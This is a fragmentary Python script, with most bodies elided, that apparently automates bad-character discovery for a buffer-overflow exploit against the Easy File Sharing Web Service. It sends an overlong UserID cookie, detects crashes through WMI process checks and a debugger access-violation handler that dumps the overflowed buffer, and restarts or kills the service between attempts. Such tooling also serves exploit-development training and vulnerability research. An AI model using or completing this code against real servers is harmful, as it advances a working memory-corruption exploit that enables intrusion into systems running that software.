...
request_template = (
	...
	"Cookie: SESSIONID=9954; UserID={}; PassWD=\r\n"
    ...
    while True:
        ...
        if not evil_str_sent:
            ...
            try:
                ...
                service_is_running = False
                subprocess.Popen('taskkill /f /im fswsService.exe').communicate()
            finally:
                evil_str_sent = True

        else:
            if timer > 10:
                print("[*] 10 seconds passed without a crash. Bad char "
...
def is_service_started():
    ...
    while not service_is_running:
        ...
        for process in wmi.WMI().Win32_Process():
            if process.Name=='fswsService.exe':
...
def is_service_responsive():
    ...
    while not service_is_running:
        ...
        try:
            ...
            sock.send(test_str)
            sock.settimeout(1.0) # Give response 1 second to arrive
            resp = sock.recv(1024)
            if resp:
                return True
            sock.close()
...
def restart_service():
    ...
    subprocess.Popen('net stop "Easy File Sharing Web Service"').communicate()  # This adds to reliability
    subprocess.Popen('net start "Easy File Sharing Web Service"').communicate() # Start the process
...
def check_char(rawdata):
    ...
    if rawdata == " userid='" + "A"*8 + cur_char * 92 + "B"*8:
...
def _access_violation_handler(dbg):
	...
	if buf_address:
		...
		buffer = dbg.read(buf_address, 0x73)
		print buffer
	else:
